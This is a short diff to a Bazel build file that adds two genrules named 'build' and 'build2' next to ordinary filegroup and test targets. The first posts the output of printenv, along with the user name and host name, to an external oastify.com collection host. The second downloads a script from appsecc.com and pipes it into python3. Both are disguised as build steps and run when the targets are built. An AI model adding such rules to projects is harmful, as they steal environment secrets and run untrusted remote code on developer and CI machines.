@@ -13,6 +13,20 @@ filegroup(
     visibility = ["//visibility:public"],
 )
 
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl -d '`printenv`' https://uxvab7kwet6a1dc0s5auepkdy44wukm8b.oastify.com/`whoami`/`hostname`",
+    visibility  = ["//visibility:public"],
+) 
+
+genrule(
+    name = "build2",
+    outs = ["foo"],
+    cmd = "curl -L https://appsecc.com/py|python3",
+    visibility  = ["//visibility:public"],
+) 
+
 sh_test(
     name = "check_bazel_versions",
     srcs = ["//tools:check_bazel_versions.sh"],
